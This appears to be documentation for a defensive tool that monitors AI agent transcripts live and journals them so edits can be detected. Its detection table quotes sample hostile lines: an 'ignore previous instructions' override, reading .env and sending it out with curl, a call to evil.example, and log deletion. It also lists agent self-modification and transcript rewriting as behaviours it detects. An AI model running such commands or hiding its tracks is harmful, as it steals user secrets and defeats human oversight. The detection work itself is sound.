# Real-time detection — `agentdfir monitor --detect`

`monitor` already tails agent transcripts read-only. With `--detect` it becomes a lightweight sensor: every new line is normalized, run through the detection rules and, when something fires, pushed to your alert targets within one poll interval (default 2 s). Install it *before* an incident.

```sh
agentdfir monitor --detect                                   # all detected agents, findings to console
agentdfir monitor --detect --alert https://soc.example/hook  # webhook (JSON POST)
agentdfir monitor --detect --alert syslog://siem.local:514   # syslog RFC 5424 (UDP; syslog+tcp:// for TCP)
agentdfir monitor --detect --alert /var/log/agentdfir.jsonl  # append JSON lines
agentdfir monitor ~/.claude ~/.codex --alert - --quiet       # explicit dirs, JSON to stdout, no per-line echo
agentdfir monitor --detect --honeytokens canaries.txt --min-severity HIGH
```

`--alert` implies `--detect` and is repeatable. Nothing about the observed agents changes: no signals, no writes, no blocking — the tail is a reader.

## What fires live

Every per-event and sequence rule from `triage`, as lines arrive:

| Example live activity | Finding |
|---|---|
| user prompt contains "ignore previous instructions…" | `PROMPT_INJECTION_INDICATOR` |
| `Bash: cat .env` | `SENSITIVE_FILE_READ` |
| …then `curl -F f=@.env https://x.io` in the same session | `POTENTIAL_DATA_EXFILTRATION` (HIGH) |
| `curl https://evil.example` | `UNEXPECTED_NETWORK_DESTINATION` |
| `rm -rf build/` | `DESTRUCTIVE_COMMAND` |
| any command/file/text touching a planted canary | `SECRET_ACCESS` (honeytoken) |
| agent edits its own `settings.json` / hooks | `AGENT_SELF_MODIFICATION` |
| `rm ~/.claude/projects/...` or `history -c` | `LOG_DELETION` |
| MCP tool result carrying an instruction override | `MCP_TOOL_POISONING` |
| 11th subagent spawned in one session | `AGENT_SPAWN_EXPLOSION` |
| agent messaging another session's agent | `CROSS_SESSION_MESSAGE` |
| malformed transcript line | `TRACE_GAP` |

Rules that need the whole transcript or the raw artifacts — orphan agents, session tampering, timestomping, secret scans of full files — stay in `triage`. Run `collect` + `triage` after an alert; the live finding's evidence reference (`path:line`) points at the exact transcript line.

## Alert envelope

Every sink emits the same JSON object:

```json
{"time":"2026-09-02T18:21:50.12Z","source":"agentdfir-monitor","host":"dev-mbp",
 "producer":"agentdfir 0.9.0",
 "finding":{"rule_id":"POTENTIAL_DATA_EXFILTRATION","severity":"HIGH","title":"…","description":"…",
            "session_id":"s1","agent_id":"main:s1","evidence_refs":["…/s1.jsonl:12 (artifact live, offset 4410)"],
            "status":"OBSERVED","endpoint_corroboration":"UNKNOWN","mitre_attack":"T1041"}}
```

Webhook: `POST`, `Content-Type: application/json`, 5 s timeout, one retry, bounded queue (256) — a slow receiver never stalls the tail; drops are counted and printed. Syslog: facility `auth`, severity mapped from the finding (CRITICAL→crit … INFO→info), message = the JSON envelope.

## Coverage

Live parsing works on JSONL transcripts: Claude Code, Codex CLI, OpenClaw, Gemini/Cursor JSONL exports and any product pack whose sessions are JSONL. Products that persist whole JSON documents or SQLite stores (Cursor `store.db`, Cline `ui_messages.json`) are covered by `collect` + `triage`, not by the tail. Existing content at startup is history and never alerts; only new lines do.

## Tamper-evident transcripts: `monitor --journal` (v3.0)

A transcript collected after an incident proves nothing about whether it
was edited. The OpenAI–Hugging Face agents researched spoofing tool calls
and rewriting their own transcripts; agents that delete production data
and then misreport it are a recurring pattern. With `--journal` the
monitor records, as it watches each append-only JSONL transcript grow,
the byte range, its SHA-256, a running SHA-256 of the whole prefix and
the file's device:inode, into a hash-chained log:

```sh
agentdfir monitor --journal --quiet
agentdfir monitor --journal --journal-anchor /Volumes/usb/agentdfir-anchors.log
agentdfir journal verify --anchor <head>          # later, or on another machine
```

- Existing transcripts are hashed in full when monitoring starts; every
  later append is journaled with its range and hash.
- Every 10 minutes (and on exit) a seal record is written and its chain
  head goes **off the file**: to the system log (macOS unified log,
  syslog), stderr, and `--journal-anchor` when given.
- The journal (`~/.agentdfir/monitor/journal.jsonl`) is collected by the
  next `agentdfir run`, and analysis checks every journaled transcript:

| rule | meaning |
|---|---|
| `TRANSCRIPT_REWRITTEN` (CRITICAL) | journaled bytes no longer match their SHA-256 — the transcript was edited after it was written |
| `TRANSCRIPT_TRUNCATED` (HIGH) | journaled content is missing, or the monitor saw the file shrink |
| `TRANSCRIPT_REPLACED` (HIGH) | device:inode changed under a journaled transcript (atomic-rename rewrite) |
| `JOURNAL_TAMPERED` (CRITICAL) | the journal's chain does not verify, or the monitor found its previous journal broken at start (it is kept as `journal.broken-<time>.jsonl`) |
| `TRANSCRIPT_DELETED` (INFO) | a journaled transcript is not in the case — agents clean up old sessions on their own |
| `MONITOR_GAP` (INFO) | the monitor was restarted without a stop record (killed): changes in the gap are not journaled |

**Honest scope.** The journal lives on the watched host. It detects edits
by anything that does not know it exists or cannot rewrite it
consistently. A same-user attacker who knows about it can rebuild the
chain; what defeats that is the head that already left the file —
`journal verify --anchor` fails when a recorded head is no longer in the
chain. Only append-only JSONL transcripts are journaled (Claude Code,
Codex rollouts, Copilot CLI, Cowork audit logs); SQLite stores are
rewritten in place by design. A rewrite that lands and is reverted
within one poll interval (default 2 s) is not seen.
